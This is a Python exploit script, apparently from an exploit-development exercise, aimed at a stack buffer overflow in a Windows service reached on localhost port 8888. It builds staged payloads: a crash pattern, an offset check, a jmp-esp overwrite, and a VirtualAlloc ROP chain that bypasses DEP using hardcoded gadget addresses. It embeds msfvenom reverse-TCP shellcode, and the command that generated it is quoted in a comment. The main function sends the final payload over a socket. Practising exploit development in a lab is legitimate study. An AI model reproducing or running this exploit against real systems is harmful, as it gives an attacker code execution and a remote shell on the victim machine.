#!/usr/local/bin/python3

import sys
from socket import *
from struct import pack

total = 2500
host = b"127.0.0.1"
port = 8888

offset = 1052

def payload1() -> bytes:
    return b"\x41" * total

def payload2() -> bytes:
    payload  = b"\x41" * offset
    payload += b"\x42" * 4
    payload += b"\x43" * (total - len(payload))
    return payload

def payload3() -> bytes:
    payload  = b"\x41" * offset
    payload += b"\x68\xfe\x05\xab"[::-1]  # 0x68fe05ab   jmp esp
    payload += b"\x90" * 12
    payload += reverse_shell()
    payload += b"\x43" * (total - len(payload))

    return payload

def payload4() -> bytes:
    # 00000000690398A0		VirtualAlloc	KERNEL32
    # Register setup: VirtualAlloc
    # --------------------------------------------
    #  EAX = ptr to &VirtualAlloc()
    #  ECX = flProtect (0x40)
    #  EDX = flAllocationType (0x1000)
    #  EBX = dwSize 0x1
    #  ESP = lpAddress (automatic)
    #  EBP = POP (skip 4 bytes)
    #  ESI = ptr to JMP [EAX] -> s -b 0x68a80000 0x69055000 ff 20
    #  EDI = ROP NOP (RETN)
    #  + place ptr to "jmp esp" on stack, below PUSHAD
    # --------------------------------------------

    rop_chain = [
        #-- ECX flProtect (0x40)
        0x68ae7ee3, # : pop eax ; ret  ;
        0xffffffc0, # 0x0 - 0x40
        0x68cef5b2, # : neg eax ; ret  ;
        0x68be726b, # : xchg eax, ecx ; ret  ;

        #-- EDX = flAllocationType (0x1000)
        0x68ae7ee3, # : pop eax ; ret  ;
        0xfffff000, # 0x0 - 0x1000
        0x68cef5b2, # : neg eax ; ret  ;
        0x68b1df17, #: xchg eax, edx ; ret  ;

        #-- EBX = dwSize 0x1
        0x68ae7ee3,  # : pop eax ; ret  ;
        0xffffffff,  # 0x0 - 0x1
        0x68cef5b2,  # : neg eax ; ret  ;
        0x68aad07c,  # : xchg eax, ebx ; ret  ;

        #-- EBP = POP (skip 4 bytes)
        0x68a812c9, #: pop ebp ; ret  ;
        0x68a812c9, # : pop ebp ; ret  ;

        #-- ESI = ptr to JMP [EAX]
        0x68a81b9d, # : pop esi ; ret  ;
        0x68fef9d3, # ff20            jmp     dword ptr[eax]

        #-- EDI = ROP NOP (RETN)
        0x68a81ad7, # : pop edi ; ret  ;
        0x68a81011, # : ret  ;

        #-- EAX = ptr to &VirtualAlloc()
        0x68ae7ee3, # : pop eax ; ret  ;
        0x690398A0, # VirtualAlloc IAT

        #-- PUSHAD
        0x68a914f5, # : pushad  ; ret  ;

        # JMP ESP
        0x68a98a7b # : jmp esp ;
    ]
    
    rop = b''.join(pack("<L", (_)) for _ in rop_chain)

    payload  = b"\x41" * offset
    payload += b"\x68\xd3\x26\xc6"[::-1]  # 0x68d326c6: add esp, 0x08 ; ret  ;
    payload += b"\x90" * 8
    payload += rop
    payload += b"\x90" * 12
    payload += reverse_shell()
    payload += b"\x43" * (total - len(payload))

    return payload

def reverse_shell() -> bytes:
    # ┌──(daniel㉿loopback-vm)-[~]
    # └─$ msfvenom -p windows/shell_reverse_tcp LHOST=eth1 LPORT=4443 --platform windows -a x86 -b '\x00\x20' -v shellcode -f python

    shellcode = b""
    shellcode += b"\xba\x02\xa3\xc7\xb6\xdb\xdf\xd9\x74\x24\xf4"
    shellcode += b"\x5e\x2b\xc9\xb1\x52\x31\x56\x12\x03\x56\x12"
    shellcode += b"\x83\xc4\xa7\x25\x43\x34\x4f\x2b\xac\xc4\x90"
    shellcode += b"\x4c\x24\x21\xa1\x4c\x52\x22\x92\x7c\x10\x66"
    shellcode += b"\x1f\xf6\x74\x92\x94\x7a\x51\x95\x1d\x30\x87"
    shellcode += b"\x98\x9e\x69\xfb\xbb\x1c\x70\x28\x1b\x1c\xbb"
    shellcode += b"\x3d\x5a\x59\xa6\xcc\x0e\x32\xac\x63\xbe\x37"
    shellcode += b"\xf8\xbf\x35\x0b\xec\xc7\xaa\xdc\x0f\xe9\x7d"
    shellcode += b"\x56\x56\x29\x7c\xbb\xe2\x60\x66\xd8\xcf\x3b"
    shellcode += b"\x1d\x2a\xbb\xbd\xf7\x62\x44\x11\x36\x4b\xb7"
    shellcode += b"\x6b\x7f\x6c\x28\x1e\x89\x8e\xd5\x19\x4e\xec"
    shellcode += b"\x01\xaf\x54\x56\xc1\x17\xb0\x66\x06\xc1\x33"
    shellcode += b"\x64\xe3\x85\x1b\x69\xf2\x4a\x10\x95\x7f\x6d"
    shellcode += b"\xf6\x1f\x3b\x4a\xd2\x44\x9f\xf3\x43\x21\x4e"
    shellcode += b"\x0b\x93\x8a\x2f\xa9\xd8\x27\x3b\xc0\x83\x2f"
    shellcode += b"\x88\xe9\x3b\xb0\x86\x7a\x48\x82\x09\xd1\xc6"
    shellcode += b"\xae\xc2\xff\x11\xd0\xf8\xb8\x8d\x2f\x03\xb9"
    shellcode += b"\x84\xeb\x57\xe9\xbe\xda\xd7\x62\x3e\xe2\x0d"
    shellcode += b"\x24\x6e\x4c\xfe\x85\xde\x2c\xae\x6d\x34\xa3"
    shellcode += b"\x91\x8e\x37\x69\xba\x25\xc2\xfa\x05\x11\xc3"
    shellcode += b"\x9e\xed\x60\xdb\x4f\xb5\xed\x3d\x05\x59\xb8"
    shellcode += b"\x96\xb2\xc0\xe1\x6c\x22\x0c\x3c\x09\x64\x86"
    shellcode += b"\xb3\xee\x2b\x6f\xb9\xfc\xdc\x9f\xf4\x5e\x4a"
    shellcode += b"\x9f\x22\xf6\x10\x32\xa9\x06\x5e\x2f\x66\x51"
    shellcode += b"\x37\x81\x7f\x37\xa5\xb8\x29\x25\x34\x5c\x11"
    shellcode += b"\xed\xe3\x9d\x9c\xec\x66\x99\xba\xfe\xbe\x22"
    shellcode += b"\x87\xaa\x6e\x75\x51\x04\xc9\x2f\x13\xfe\x83"
    shellcode += b"\x9c\xfd\x96\x52\xef\x3d\xe0\x5a\x3a\xc8\x0c"
    shellcode += b"\xea\x93\x8d\x33\xc3\x73\x1a\x4c\x39\xe4\xe5"
    shellcode += b"\x87\xf9\x14\xac\x85\xa8\xbc\x69\x5c\xe9\xa0"
    shellcode += b"\x89\x8b\x2e\xdd\x09\x39\xcf\x1a\x11\x48\xca"
    shellcode += b"\x67\x95\xa1\xa6\xf8\x70\xc5\x15\xf8\x50"
    return shellcode

def main():
    payload = payload4()

    print("\n[!] Connecting to %s:%s ..." % (host, port))

    s = socket(AF_INET, SOCK_STREAM)
    s.connect((host, port))

    print("[!] Sending the packet...")

    s.send(payload)
    s.close()

    print("[+] Packet sent")
    sys.exit(0)

if __name__ == "__main__":
    main()
